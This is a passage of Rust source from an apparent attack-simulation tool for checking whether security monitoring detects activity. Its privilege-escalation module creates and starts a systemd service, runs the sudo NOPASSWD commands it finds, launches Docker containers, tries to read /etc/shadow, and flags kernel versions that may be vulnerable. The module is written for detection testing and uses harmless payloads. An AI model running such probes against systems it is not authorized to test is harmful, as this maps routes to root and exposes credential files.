                        return Err("Cleanup for this technique requires root privileges".to_string());
                    }
                    
                    info!("Cleaning up user account: {username}");
                    
                    // Step 1: Kill any processes running as the user
                    info!("Step 1: Terminating any processes running as {username}");
                    let pkill_status = Command::new("pkill")
                        .args(["-u", username])
                        .status()
                        .await;
                        
                    match pkill_status {
                        Ok(status) => {
                            if status.success() {
                                info!("✓ Terminated processes for user {username}");
                            } else {
                                info!("No processes found running as {username}");
                            }
                        }
                        Err(e) => {
                            warn!("Failed to check for user processes: {e}");
                        }
                    }
                    
                    // Give processes time to terminate
                    tokio::time::sleep(tokio::time::Duration::from_millis(500)).await;
                    
                    // Step 2: Delete the user account with userdel -r (removes home directory)
                    info!("Step 2: Deleting user account {username} and home directory");
                    let status = Command::new("userdel")
                        .args(["-r", username])
                        .status()
                        .await;
                        
                    match status {
                        Ok(status) => {
                            if status.success() {
                                info!("✓ Removed user account {username} and home directory");
                            } else {
                                warn!("Failed to remove user account {username}");
                            }
                        }
                        Err(e) => {
                            warn!("Failed to execute userdel for {username}: {e}");
                        }
                    }
                    
                    // Step 3: Verify all artifacts removed
                    info!("Step 3: Verifying removal of {username}");
                    let verify = Command::new("id")
                        .arg(username)
                        .output()
                        .await;
                        
                    match verify {
                        Ok(output) => {
                            if !output.status.success() {
                                info!("✓ Verified: User {username} no longer exists");
                            } else {
                                warn!("User {username} still exists after deletion attempt");
                            }
                        }
                        Err(e) => {
                            warn!("Failed to verify user deletion: {e}");
                        }
                    }
                    
                    // Verify home directory removed
                    let home_dir = format!("/home/{username}");
                    if !Path::new(&home_dir).exists() {
                        info!("✓ Verified: Home directory {home_dir} removed");
                    } else {
                        warn!("Home directory {home_dir} still exists");
                        // Try to remove it manually
                        let _ = fs::remove_dir_all(&home_dir);
                    }
                }
            }
            Ok(())
        })
    }
}

pub struct PrivilegeEscalationExploit {}

#[async_trait]
impl AttackTechnique for PrivilegeEscalationExploit {
    fn info(&self) -> Technique {
        Technique {
            id: "T1068".to_string(),
            name: "Exploitation for Privilege Escalation".to_string(),
            description: "Performs REAL privilege escalation EXPLOITATION ATTEMPTS including SUID binary enumeration, systemd service creation attempts, writable cron files, active sudo command testing, Docker container operations, file permissions checks, and kernel vulnerability enumeration. This technique actively ATTEMPTS to exploit privilege escalation vectors - not just enumerate them. When writable systemd units are found, it creates test services and attempts daemon-reload. When Docker socket is accessible, it attempts container operations. When sudo NOPASSWD entries are found, it attempts to execute allowed commands. All operations are tracked and fully reversible via cleanup.".to_string(),
            category: "privilege_escalation".to_string(),
            parameters: vec![
                TechniqueParameter {
                    name: "log_file".to_string(),
                    description: "Path to save detailed privilege escalation exploitation log".to_string(),
                    required: false,
                    default: Some("/tmp/signalbench_privesc_exploit.log".to_string()),
                },
                TechniqueParameter {
                    name: "suid_scan".to_string(),
                    description: "Enable SUID binary enumeration".to_string(),
                    required: false,
                    default: Some("true".to_string()),
                },
                TechniqueParameter {
                    name: "systemd_exploit".to_string(),
                    description: "ATTEMPT systemd unit exploitation if writable units found".to_string(),
                    required: false,
                    default: Some("true".to_string()),
                },
                TechniqueParameter {
                    name: "cron_scan".to_string(),
                    description: "Enable writable cron file enumeration".to_string(),
                    required: false,
                    default: Some("true".to_string()),
                },
                TechniqueParameter {
                    name: "sudo_exploit".to_string(),
                    description: "ATTEMPT sudo command execution if NOPASSWD entries found".to_string(),
                    required: false,
                    default: Some("true".to_string()),
                },
                TechniqueParameter {
                    name: "docker_exploit".to_string(),
                    description: "ATTEMPT Docker container operations if socket accessible".to_string(),
                    required: false,
                    default: Some("true".to_string()),
                },
                TechniqueParameter {
                    name: "kernel_check".to_string(),
                    description: "Enable kernel version vulnerability enumeration".to_string(),
                    required: false,
                    default: Some("true".to_string()),
                },
            ],
            detection: "Monitor for SUID binary enumeration (find -perm -4000), systemd service file creation in /etc/systemd/system/, systemctl daemon-reload commands, systemctl start/enable commands, cron file enumeration, sudo -l execution, sudo NOPASSWD command testing, docker ps commands, docker run operations with privileged flags, Docker container creation, /etc/passwd and /etc/shadow read attempts, kernel version checks (uname -r), and privilege escalation exploitation attempts. EDR systems will detect: systemd service creation events, Docker socket abuse patterns, sudo privilege testing, and file system modifications in privileged directories.".to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["user".to_string()],
        }
    }

    fn execute<'a>(&'a self, config: &'a TechniqueConfig, dry_run: bool) -> ExecuteFuture<'a> {
        Box::pin(async move {
            let log_file = config.parameters.get("log_file").unwrap_or(&"/tmp/signalbench_privesc_exploit.log".to_string()).clone();
            let suid_scan = config.parameters.get("suid_scan").unwrap_or(&"true".to_string()).to_lowercase() == "true";
            let systemd_exploit = config.parameters.get("systemd_exploit").unwrap_or(&"true".to_string()).to_lowercase() == "true";
            let cron_scan = config.parameters.get("cron_scan").unwrap_or(&"true".to_string()).to_lowercase() == "true";
            let sudo_exploit = config.parameters.get("sudo_exploit").unwrap_or(&"true".to_string()).to_lowercase() == "true";
            let docker_exploit = config.parameters.get("docker_exploit").unwrap_or(&"true".to_string()).to_lowercase() == "true";
            let kernel_check = config.parameters.get("kernel_check").unwrap_or(&"true".to_string()).to_lowercase() == "true";
            
            let mut artifacts = vec![log_file.clone()];
            
            if dry_run {
                info!("[DRY RUN] Would perform comprehensive privilege escalation EXPLOITATION:");
                info!("[DRY RUN] - SUID binaries enumeration: {suid_scan}");
                info!("[DRY RUN] - Systemd unit EXPLOITATION: {systemd_exploit}");
                info!("[DRY RUN] - Writable cron files scan: {cron_scan}");
                info!("[DRY RUN] - Sudo command EXPLOITATION: {sudo_exploit}");
                info!("[DRY RUN] - Docker socket EXPLOITATION: {docker_exploit}");
                info!("[DRY RUN] - Kernel vulnerability enumeration: {kernel_check}");
                info!("[DRY RUN] - Log file: {log_file}");
                return Ok(SimulationResult {
                    technique_id: self.info().id,
                    success: true,
                    message: "DRY RUN: Would perform REAL privilege escalation EXPLOITATION".to_string(),
                    artifacts,
                    cleanup_required: false,
                });
            }

            info!("Starting REAL privilege escalation EXPLOITATION - This will be detected by security tools!");
            
            // Create detailed log file
            let mut log = File::create(&log_file)
                .map_err(|e| format!("Failed to create log file: {e}"))?;
            
            writeln!(log, "═══════════════════════════════════════════════════════════════════════").unwrap();
            writeln!(log, "SignalBench Privilege Escalation EXPLOITATION - REAL ATTACK SIMULATION").unwrap();
            writeln!(log, "MITRE ATT&CK Technique: T1068 - Exploitation for Privilege Escalation").unwrap();
            writeln!(log, "Timestamp: {}", chrono::Local::now()).unwrap();
            writeln!(log, "User: {}", whoami::username()).unwrap();
            writeln!(log, "Hostname: {}", hostname::get().unwrap_or_default().to_string_lossy()).unwrap();
            writeln!(log, "═══════════════════════════════════════════════════════════════════════\n").unwrap();
            
            let mut findings = Vec::new();
            let mut suid_count = 0;
            let mut writable_systemd_count = 0;
            let mut writable_cron_count = 0;
            let mut sudo_privs_found = false;
            let mut docker_access = false;
            let mut passwd_readable = false;
            let mut shadow_readable = false;
            let mut systemd_service_created = false;
            let mut docker_container_ran = false;
            let mut sudo_commands_tested = Vec::new();
            
            // 1. Enumerate SUID binaries
            if suid_scan {
                info!("Enumerating SUID binaries (find / -perm -4000)...");
                writeln!(log, "\n[1] SUID BINARY ENUMERATION").unwrap();
                writeln!(log, "Command: find / -perm -4000 -type f 2>/dev/null").unwrap();
                writeln!(log, "─────────────────────────────────────────────────────────────────────").unwrap();
                
                // Optimised: Search common directories instead of entire filesystem for performance
                let search_paths = vec!["/usr/bin", "/usr/sbin", "/usr/local/bin", "/usr/local/sbin", "/bin", "/sbin"];
                
                for search_path in &search_paths {
                    if Path::new(search_path).exists() {
                        let output = Command::new("find")
                            .args([search_path, "-perm", "-4000", "-type", "f"])
                            .stderr(std::process::Stdio::null())
                            .output()
                            .await;
                            
                        if let Ok(output) = output {
                            let suid_binaries = String::from_utf8_lossy(&output.stdout);
                            for binary in suid_binaries.lines() {
                                if !binary.is_empty() {
                                    suid_count += 1;
                                    writeln!(log, "  [SUID] {binary}").unwrap();
                                }
                            }
                        }
                    }
                }
                
                if suid_count > 0 {
                    findings.push(format!("{suid_count} SUID binaries found"));
                    info!("✓ Found {suid_count} SUID binaries");
                } else {
                    writeln!(log, "  No SUID binaries found in common directories").unwrap();
                }
            }
            
            // 2. ATTEMPT systemd unit exploitation
            if systemd_exploit {
                info!("Checking for writable systemd unit files and ATTEMPTING exploitation...");
                writeln!(log, "\n[2] SYSTEMD UNIT EXPLOITATION ATTEMPT").unwrap();
                writeln!(log, "Locations: /etc/systemd/system/, /lib/systemd/system/").unwrap();
                writeln!(log, "─────────────────────────────────────────────────────────────────────").unwrap();
                
                // First enumerate writable systemd directories
                let systemd_writable = Path::new("/etc/systemd/system").exists() && 
                    fs::metadata("/etc/systemd/system")
                        .map(|m| !m.permissions().readonly())
                        .unwrap_or(false);
                
                if systemd_writable {
                    writeln!(log, "  [WRITABLE] /etc/systemd/system directory is writable").unwrap();
                    writable_systemd_count += 1;
                    
                    // ATTEMPT to create test service
                    let service_file = "/etc/systemd/system/signalbench-test.service";
                    writeln!(log, "\n  ATTEMPTING to create test service: {service_file}").unwrap();
                    info!("Attempting to create systemd test service...");
                    
                    let service_content = format!(
                        "[Unit]\n\
                        Description=SignalBench Privilege Escalation Test Service\n\
                        # MITRE ATT&CK T1068 - FOR TESTING ONLY\n\
                        # Created: {}\n\n\
                        [Service]\n\
                        Type=oneshot\n\
                        ExecStart=/bin/true\n\
                        RemainAfterExit=yes\n\n\
                        [Install]\n\
                        WantedBy=multi-user.target\n",
                        chrono::Local::now()
                    );
                    
                    match fs::write(service_file, &service_content) {
                        Ok(_) => {
                            writeln!(log, "  ✓ SUCCESS: Created service file {service_file}").unwrap();
                            info!("✓ Created systemd service file");
                            systemd_service_created = true;
                            artifacts.push(format!("systemd:{service_file}"));
                            findings.push("Systemd service created".to_string());
                            
                            // ATTEMPT systemctl daemon-reload
                            writeln!(log, "\n  ATTEMPTING: systemctl daemon-reload").unwrap();
                            let reload_result = Command::new("systemctl")
                                .arg("daemon-reload")
                                .output()
                                .await;
                                
                            match reload_result {
                                Ok(output) if output.status.success() => {
                                    writeln!(log, "  ✓ SUCCESS: daemon-reload completed").unwrap();
                                    info!("✓ systemctl daemon-reload successful");
                                    
                                    // ATTEMPT to start the service
                                    writeln!(log, "\n  ATTEMPTING: systemctl start signalbench-test").unwrap();
                                    let start_result = Command::new("systemctl")
                                        .args(["start", "signalbench-test"])
                                        .output()
                                        .await;
                                        
                                    match start_result {
                                        Ok(output) if output.status.success() => {
                                            writeln!(log, "  ✓ CRITICAL SUCCESS: Service started successfully!").unwrap();
                                            info!("✓ CRITICAL: systemd service started - privilege escalation vector confirmed!");
                                            artifacts.push("systemd:started:signalbench-test".to_string());
                                            findings.push("Systemd service STARTED (Critical!)".to_string());
                                        }
                                        Ok(output) => {
                                            let stderr = String::from_utf8_lossy(&output.stderr);
                                            writeln!(log, "  ✗ Service start failed: {stderr}").unwrap();
                                        }
                                        Err(e) => {
                                            writeln!(log, "  ✗ Could not execute systemctl start: {e}").unwrap();
                                        }
                                    }
                                }
                                Ok(output) => {
                                    let stderr = String::from_utf8_lossy(&output.stderr);
                                    writeln!(log, "  ✗ daemon-reload failed: {stderr}").unwrap();
                                }
                                Err(e) => {
                                    writeln!(log, "  ✗ Could not execute systemctl daemon-reload: {e}").unwrap();
                                }
                            }
                        }
                        Err(e) => {
                            writeln!(log, "  ✗ FAILED to create service file: {e}").unwrap();
                            writeln!(log, "  (This is expected if not running as root)").unwrap();
                        }
                    }
                } else {
                    writeln!(log, "  /etc/systemd/system is not writable by current user").unwrap();
                    writeln!(log, "  (This is expected - systemd exploitation typically requires elevated privileges)").unwrap();
                }
                
                // Also check for any existing writable service files
                for systemd_path in &["/etc/systemd/system", "/lib/systemd/system"] {
                    if Path::new(systemd_path).exists() {
                        let output = Command::new("find")
                            .args([systemd_path, "-type", "f", "-writable", "-name", "*.service"])
                            .stderr(std::process::Stdio::null())
                            .output()
                            .await;
                            
                        if let Ok(output) = output {
                            let writable_files = String::from_utf8_lossy(&output.stdout);
                            for file in writable_files.lines() {
                                if !file.is_empty() && !file.contains("signalbench-test") {
                                    writeln!(log, "  [WRITABLE] Existing service file: {file}").unwrap();
                                }
                            }
                        }
                    }
                }
                
                if writable_systemd_count > 0 || systemd_service_created {
                    info!("✓ Systemd exploitation attempt completed");
                }
            }
            
            // 3. Check for writable cron files
            if cron_scan {
                info!("Checking for writable cron files...");
                writeln!(log, "\n[3] WRITABLE CRON FILES").unwrap();
                writeln!(log, "Locations: /etc/cron.d/, /etc/crontab, /var/spool/cron/").unwrap();
                writeln!(log, "─────────────────────────────────────────────────────────────────────").unwrap();
                
                // Check /etc/crontab
                if Path::new("/etc/crontab").exists() {
                    let metadata = fs::metadata("/etc/crontab");
                    if let Ok(meta) = metadata {
                        use std::os::unix::fs::PermissionsExt;
                        let mode = meta.permissions().mode();
                        if mode & 0o002 != 0 {  // World writable
                            writable_cron_count += 1;
                            writeln!(log,"  [WRITABLE] /etc/crontab (permissions: {mode:o})").unwrap();
                        }
                    }
                }
                
                // Check directories
                for cron_path in &["/etc/cron.d", "/var/spool/cron"] {
                    if Path::new(cron_path).exists() {
                        let output = Command::new("find")
                            .args([cron_path, "-type", "f", "-writable"])
                            .stderr(std::process::Stdio::null())
                            .output()
                            .await;
                            
                        if let Ok(output) = output {
                            let writable_files = String::from_utf8_lossy(&output.stdout);
                            for file in writable_files.lines() {
                                if !file.is_empty() {
                                    writable_cron_count += 1;
                                    writeln!(log,"  [WRITABLE] {file}").unwrap();
                                }
                            }
                        }
                    }
                }
                
                if writable_cron_count > 0 {
                    findings.push(format!("{writable_cron_count} writable cron files"));
                    info!("✓ Found {writable_cron_count} writable cron files");
                } else {
                    writeln!(log, "  No writable cron files found").unwrap();
                }
            }
            
            // 4. ATTEMPT sudo privilege exploitation
            if sudo_exploit {
                info!("Checking sudo privileges and ATTEMPTING command execution...");
                writeln!(log, "\n[4] SUDO PRIVILEGE EXPLOITATION ATTEMPT").unwrap();
                writeln!(log, "Command: sudo -l").unwrap();
                writeln!(log, "─────────────────────────────────────────────────────────────────────").unwrap();
                
                let output = Command::new("sudo")
                    .args(["-n", "-l"])
                    .output()
                    .await;
                    
                match output {
                    Ok(output) => {
                        let sudo_output = String::from_utf8_lossy(&output.stdout);
                        let sudo_stderr = String::from_utf8_lossy(&output.stderr);
                        
                        if output.status.success() && !sudo_output.is_empty() {
                            sudo_privs_found = true;
                            writeln!(log, "{sudo_output}").unwrap();
                            info!("✓ Sudo privileges detected");
                            
                            // Parse for NOPASSWD entries
                            writeln!(log, "\n  Parsing for NOPASSWD entries...").unwrap();
                            let mut nopasswd_commands = Vec::new();
                            
                            for line in sudo_output.lines() {
                                if line.contains("NOPASSWD") {
                                    writeln!(log, "  [NOPASSWD] {line}").unwrap();
                                    // Extract command from line
                                    if let Some(cmd_start) = line.rfind(") ") {
                                        let cmd = line[cmd_start + 2..].trim();
                                        if !cmd.is_empty() && cmd != "ALL" {
                                            nopasswd_commands.push(cmd.to_string());
                                        }
                                    }
                                }
                            }
                            
                            if !nopasswd_commands.is_empty() {
                                writeln!(log, "\n  Found {} NOPASSWD command(s) - ATTEMPTING execution:", nopasswd_commands.len()).unwrap();
                                findings.push(format!("{} NOPASSWD sudo commands", nopasswd_commands.len()));
                                
                                // ATTEMPT to test safe/non-destructive commands
                                for cmd in &nopasswd_commands {
                                    // Only test safe commands
                                    let safe_commands = ["whoami", "id", "ls", "cat", "echo", "true", "false", "pwd"];
                                    let is_safe = safe_commands.iter().any(|&safe| cmd.contains(safe));
                                    
                                    if is_safe || cmd.ends_with("/bin/true") || cmd.ends_with("/bin/false") {
                                        writeln!(log, "\n  ATTEMPTING: sudo -n {cmd}").unwrap();
                                        info!("Testing sudo NOPASSWD command: {cmd}");
                                        
                                        let test_result = Command::new("sudo")
                                            .arg("-n")
                                            .args(cmd.split_whitespace())
                                            .output()
                                            .await;
                                            
                                        match test_result {
                                            Ok(test_output) if test_output.status.success() => {
                                                let stdout = String::from_utf8_lossy(&test_output.stdout);
                                                writeln!(log, "  ✓ SUCCESS: Command executed without password!").unwrap();
                                                writeln!(log, "  Output: {stdout}").unwrap();
                                                info!("✓ CRITICAL: sudo command executed without password!");
                                                sudo_commands_tested.push(cmd.clone());
                                                findings.push(format!("Executed sudo command: {cmd}"));
                                            }
                                            Ok(test_output) => {
                                                let stderr = String::from_utf8_lossy(&test_output.stderr);
                                                writeln!(log, "  ✗ Failed: {stderr}").unwrap();
                                            }
                                            Err(e) => {
                                                writeln!(log, "  ✗ Error: {e}").unwrap();
                                            }
                                        }
                                    } else {
                                        writeln!(log, "\n  SKIPPED (not safe to test): {cmd}").unwrap();
                                    }
                                }
                            } else {
                                writeln!(log, "  No NOPASSWD entries found").unwrap();
                            }
                            
                            // Also check for (ALL) ALL permissions
                            if sudo_output.contains("(ALL) ALL") || sudo_output.contains("(ALL:ALL) ALL") {
                                writeln!(log, "\n  [CRITICAL] User has (ALL) ALL sudo permissions!").unwrap();
                                findings.push("User has full sudo access".to_string());
                            }
                        } else {
                            writeln!(log, "  No sudo privileges or password required").unwrap();
                            if !sudo_stderr.is_empty() {
                                writeln!(log, "  Details: {sudo_stderr}").unwrap();
                            }
                        }
                    }
                    Err(e) => {
                        writeln!(log, "  sudo not available or error: {e}").unwrap();
                    }
                }
                
                if !sudo_commands_tested.is_empty() {
                    info!("✓ Tested {} sudo NOPASSWD commands", sudo_commands_tested.len());
                }
            }
            
            // 5. ATTEMPT Docker socket exploitation
            if docker_exploit {
                info!("Checking Docker socket access and ATTEMPTING container operations...");
                writeln!(log, "\n[5] DOCKER SOCKET EXPLOITATION ATTEMPT").unwrap();
                writeln!(log, "Location: /var/run/docker.sock").unwrap();
                writeln!(log, "─────────────────────────────────────────────────────────────────────").unwrap();
                
                if Path::new("/var/run/docker.sock").exists() {
                    let metadata = fs::metadata("/var/run/docker.sock");
                    match metadata {
                        Ok(meta) => {
                            use std::os::unix::fs::PermissionsExt;
                            let mode = meta.permissions().mode();
                            writeln!(log, "  [FOUND] /var/run/docker.sock (permissions: {mode:o})").unwrap();
                            
                            // ATTEMPT: docker ps to verify access
                            writeln!(log, "\n  ATTEMPTING: docker ps").unwrap();
                            info!("Attempting docker ps command...");
                            
                            let test_access = Command::new("docker")
                                .args(["ps"])
                                .output()
                                .await;
                                
                            match test_access {
                                Ok(output) if output.status.success() => {
                                    docker_access = true;
                                    let stdout = String::from_utf8_lossy(&output.stdout);
                                    writeln!(log, "  ✓ SUCCESS: Docker socket is ACCESSIBLE!").unwrap();
                                    writeln!(log, "  Output:\n{stdout}").unwrap();
                                    findings.push("Docker socket accessible".to_string());
                                    info!("✓ CRITICAL: Docker socket is accessible!");
                                    
                                    // ATTEMPT: docker run test container
                                    writeln!(log, "\n  ATTEMPTING: docker run --rm alpine echo 'SignalBench Docker Test'").unwrap();
                                    info!("Attempting to run test Docker container...");
                                    
                                    let container_test = Command::new("docker")
                                        .args(["run", "--rm", "alpine", "echo", "SignalBench Docker Test"])
                                        .output()
                                        .await;
                                        
                                    match container_test {
                                        Ok(container_output) if container_output.status.success() => {
                                            let container_stdout = String::from_utf8_lossy(&container_output.stdout);
                                            writeln!(log, "  ✓ CRITICAL SUCCESS: Docker container executed!").unwrap();
                                            writeln!(log, "  Container output: {container_stdout}").unwrap();
                                            info!("✓ CRITICAL: Docker container executed - privilege escalation vector confirmed!");
                                            docker_container_ran = true;
                                            findings.push("Docker container EXECUTED (Critical!)".to_string());
                                        }
                                        Ok(container_output) => {
                                            let stderr = String::from_utf8_lossy(&container_output.stderr);
                                            writeln!(log, "  ✗ Container execution failed: {stderr}").unwrap();
                                            writeln!(log, "  (Alpine image may not be available - docker ps still worked)").unwrap();
                                        }
                                        Err(e) => {
                                            writeln!(log, "  ✗ Could not execute docker run: {e}").unwrap();
                                        }
                                    }
                                    
                                    // List Docker images
                                    writeln!(log, "\n  ENUMERATING: docker images").unwrap();
                                    let images_cmd = Command::new("docker")
                                        .args(["images"])
                                        .output()
                                        .await;
                                        
                                    if let Ok(images_output) = images_cmd {
                                        if images_output.status.success() {
                                            let images_stdout = String::from_utf8_lossy(&images_output.stdout);
                                            writeln!(log, "  Available Docker images:\n{images_stdout}").unwrap();
                                        }
                                    }
                                    
                                    // Check Docker version for context
                                    let version_cmd = Command::new("docker")
                                        .args(["version", "--format", "{{.Server.Version}}"])
                                        .output()
                                        .await;
                                        
                                    if let Ok(version_output) = version_cmd {
                                        if version_output.status.success() {
                                            let version = String::from_utf8_lossy(&version_output.stdout);
                                            writeln!(log, "\n  Docker server version: {}", version.trim()).unwrap();
                                        }
                                    }
                                }
                                Ok(output) => {
                                    let stderr = String::from_utf8_lossy(&output.stderr);
                                    writeln!(log, "  ✗ RESTRICTED: Docker socket exists but not accessible").unwrap();
                                    writeln!(log, "  Error: {stderr}").unwrap();
                                }
                                Err(e) => {
                                    writeln!(log, "  ✗ Docker command not available: {e}").unwrap();
                                    writeln!(log, "  (Docker CLI may not be installed)").unwrap();
                                }
                            }
                        }
                        Err(e) => {
                            writeln!(log, "  ERROR: Cannot check Docker socket metadata: {e}").unwrap();
                        }
                    }
                } else {
                    writeln!(log, "  Docker socket not found at /var/run/docker.sock").unwrap();
                    writeln!(log, "  (This is normal on systems without Docker installed)").unwrap();
                }
                
                if docker_access {
                    info!("✓ Docker socket exploitation attempt completed - socket is accessible!");
                }
            }
            
            // 6. Check /etc/passwd and /etc/shadow permissions
            info!("Checking /etc/passwd and /etc/shadow permissions...");
            writeln!(log, "\n[6] SENSITIVE FILE PERMISSIONS").unwrap();
            writeln!(log, "Files: /etc/passwd, /etc/shadow").unwrap();
            writeln!(log, "─────────────────────────────────────────────────────────────────────").unwrap();
            
            if Path::new("/etc/passwd").exists() {
                let read_test = fs::read_to_string("/etc/passwd");
                match read_test {
                    Ok(_) => {
                        passwd_readable = true;
                        writeln!(log, "  [READABLE] /etc/passwd is readable").unwrap();
                        
                        let metadata = fs::metadata("/etc/passwd");
                        if let Ok(meta) = metadata {
                            use std::os::unix::fs::PermissionsExt;
                            let mode = meta.permissions().mode();
                            writeln!(log,"    Permissions: {mode:o}").unwrap();
                            if mode & 0o002 != 0 {
                                writeln!(log, "    [CRITICAL] /etc/passwd is WORLD WRITABLE!").unwrap();
                                findings.push("/etc/passwd is writable".to_string());
                            }
                        }
                    }
                    Err(e) => {
                        writeln!(log,"  /etc/passwd: Not readable - {e}").unwrap();
                    }
                }
            }
            
            if Path::new("/etc/shadow").exists() {
                let read_test = fs::read_to_string("/etc/shadow");
                match read_test {
                    Ok(_) => {
                        shadow_readable = true;
                        writeln!(log, "  [CRITICAL] /etc/shadow is READABLE - Major security issue!").unwrap();
                        findings.push("/etc/shadow is readable".to_string());
                        info!("✓ /etc/shadow is readable (critical finding!)");
                        
                        let metadata = fs::metadata("/etc/shadow");
                        if let Ok(meta) = metadata {
                            use std::os::unix::fs::PermissionsExt;
                            let mode = meta.permissions().mode();
                            writeln!(log,"    Permissions: {mode:o}").unwrap();
                        }
                    }
                    Err(_) => {
                        writeln!(log, "  /etc/shadow: Not readable (expected)").unwrap();
                    }
                }
            }
            
            // 7. Kernel vulnerability enumeration (enumeration only - no exploitation)
            if kernel_check {
                info!("Enumerating kernel version for known vulnerabilities...");
                writeln!(log, "\n[7] KERNEL VULNERABILITY ENUMERATION").unwrap();
                writeln!(log, "Commands: uname -a, uname -r").unwrap();
                writeln!(log, "─────────────────────────────────────────────────────────────────────").unwrap();
                
                // Get full kernel info
                let output = Command::new("uname")
                    .arg("-a")
                    .output()
                    .await;
                    
                if let Ok(output) = output {
                    let kernel_info = String::from_utf8_lossy(&output.stdout);
                    writeln!(log, "  Full kernel info: {}", kernel_info.trim()).unwrap();
                }
                
                // Get kernel version (uname -r as specified in requirements)
                let version_output = Command::new("uname")
                    .arg("-r")
                    .output()
                    .await;
                    
                if let Ok(version_output) = version_output {
                    let kernel_version = String::from_utf8_lossy(&version_output.stdout);
                    let version = kernel_version.trim();
                    writeln!(log, "  Kernel version (-r): {version}").unwrap();
                    info!("Kernel version: {version}");
                    
                    writeln!(log, "\n  Known Kernel Exploit Patterns (CVE Database):").unwrap();
                    writeln!(log, "  ─────────────────────────────────────────────────────────────────").unwrap();
                    writeln!(log, "  - Dirty Pipe (CVE-2022-0847): Linux kernel 5.8 - 5.16.11").unwrap();
                    writeln!(log, "  - Dirty COW (CVE-2016-5195): Linux kernel 2.6.22 - 4.8.3").unwrap();
                    writeln!(log, "  - PwnKit (CVE-2021-4034): polkit vulnerability").unwrap();
                    writeln!(log, "  - Baron Samedit (CVE-2021-3156): sudo vulnerability").unwrap();
                    writeln!(log, "  - Netfilter (CVE-2021-22555): Linux kernel < 5.11.15").unwrap();
                    writeln!(log, "  - OverlayFS (CVE-2021-3493): Linux kernel < 5.11").unwrap();
                    writeln!(log, "  - Sequoia (CVE-2021-33909): Linux kernel < 5.13.4").unwrap();
                    writeln!(log, "  NOTE: Enumeration only - not actually exploiting").unwrap();
                    
                    // Pattern matching for known vulnerable versions
                    if version.contains("5.8") || version.contains("5.9") || version.contains("5.10") || 
                       version.contains("5.11") || version.contains("5.12") || version.contains("5.13") ||
                       version.contains("5.14") || version.contains("5.15") || version.contains("5.16") {
                        writeln!(log, "\n  [WARNING] Kernel version potentially vulnerable to Dirty Pipe (CVE-2022-0847)").unwrap();
                        findings.push("Potentially vulnerable kernel (Dirty Pipe)".to_string());
                    }
                    
                    if version.starts_with("5.") && !version.contains("5.13.") && !version.contains("5.14.") {
                        writeln!(log, "  [WARNING] Kernel may be vulnerable to Sequoia (CVE-2021-33909)").unwrap();
                    }
                    
                    if version.starts_with("4.") {
                        writeln!(log, "  [WARNING] Kernel 4.x may be vulnerable to Dirty COW (CVE-2016-5195)").unwrap();
                        findings.push("Potentially vulnerable kernel (Dirty COW)".to_string());
                    }
                }
                
                info!("✓ Kernel vulnerability enumeration completed");
            }
            
            // Summary
            writeln!(log, "\n═══════════════════════════════════════════════════════════════════════").unwrap();
            writeln!(log, "PRIVILEGE ESCALATION EXPLOITATION SUMMARY").unwrap();
            writeln!(log, "═══════════════════════════════════════════════════════════════════════").unwrap();
            writeln!(log, "ENUMERATION RESULTS:").unwrap();
            writeln!(log,"  SUID binaries found: {suid_count}").unwrap();
            writeln!(log,"  Writable systemd units: {writable_systemd_count}").unwrap();
            writeln!(log,"  Writable cron files: {writable_cron_count}").unwrap();
            writeln!(log, "  Sudo privileges: {}", if sudo_privs_found { "Yes" } else { "No" }).unwrap();
            writeln!(log, "  Docker socket accessible: {}", if docker_access { "Yes (CRITICAL)" } else { "No" }).unwrap();
            writeln!(log, "  /etc/passwd readable: {}", if passwd_readable { "Yes" } else { "No" }).unwrap();
            writeln!(log, "  /etc/shadow readable: {}", if shadow_readable { "Yes (CRITICAL)" } else { "No" }).unwrap();
            
            writeln!(log, "\nEXPLOITATION ATTEMPTS:").unwrap();
            writeln!(log, "  Systemd service created: {}", if systemd_service_created { "YES (file created)" } else { "No" }).unwrap();
            writeln!(log, "  Docker container ran: {}", if docker_container_ran { "YES (container executed)" } else { "No" }).unwrap();
            writeln!(log, "  Sudo commands tested: {}", sudo_commands_tested.len()).unwrap();
            if !sudo_commands_tested.is_empty() {
                for cmd in &sudo_commands_tested {
                    writeln!(log, "    - {cmd}").unwrap();
                }
            }
            
            writeln!(log, "\nTotal privilege escalation vectors found: {}", findings.len()).unwrap();
            
            if !findings.is_empty() {
                writeln!(log, "\nPRIVILEGE ESCALATION VECTORS:").unwrap();
                for (i, finding) in findings.iter().enumerate() {
                    writeln!(log, "  {}. {}", i + 1, finding).unwrap();
                }
            }
            
            writeln!(log, "\n═══════════════════════════════════════════════════════════════════════").unwrap();
            writeln!(log,"End of exploitation attempt - Log saved to: {log_file}").unwrap();
            writeln!(log, "SignalBench by GoCortex.io - FOR SECURITY TESTING ONLY").unwrap();
            writeln!(log, "All operations are REVERSIBLE via cleanup").unwrap();
            writeln!(log, "═══════════════════════════════════════════════════════════════════════").unwrap();
            
            let mut summary_parts = vec![
                format!("ENUMERATION: {} SUID binaries, {} systemd, {} cron, sudo={}, docker={}", 
                    suid_count, writable_systemd_count, writable_cron_count,
                    if sudo_privs_found { "Yes" } else { "No" },
                    if docker_access { "Yes" } else { "No" })
            ];
            
            if systemd_service_created || docker_container_ran || !sudo_commands_tested.is_empty() {
                let mut exploit_parts = Vec::new();
                if systemd_service_created { exploit_parts.push("systemd service created".to_string()); }
                if docker_container_ran { exploit_parts.push("docker container executed".to_string()); }
                if !sudo_commands_tested.is_empty() { 
                    exploit_parts.push(format!("{} sudo commands tested", sudo_commands_tested.len())); 
                }
                summary_parts.push(format!("EXPLOITATION: {}", exploit_parts.join(", ")));
            } else {
                summary_parts.push("EXPLOITATION: No active exploits succeeded".to_string());
            }
            
            summary_parts.push(format!("Total vectors: {}", findings.len()));
            summary_parts.push(format!("Log: {log_file}"));
            
            let summary = format!(
                "Privilege escalation exploitation attempt complete:\n  ✓ {}\n  ✓ {}\n  ✓ {}\n  ✓ {}",
                summary_parts[0], summary_parts[1], summary_parts[2], summary_parts[3]
            );
            
            info!("{summary}");
            
            Ok(SimulationResult {
                technique_id: self.info().id,
                success: true,
                message: summary,
                artifacts,
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            info!("Starting privilege escalation exploitation cleanup");
            
            for artifact in artifacts {
                // Handle systemd service cleanup
                if artifact.starts_with("systemd:started:") {
                    let service_name = artifact.trim_start_matches("systemd:started:");
                    info!("Stopping systemd service: {service_name}");
                    
                    let stop_result = Command::new("systemctl")
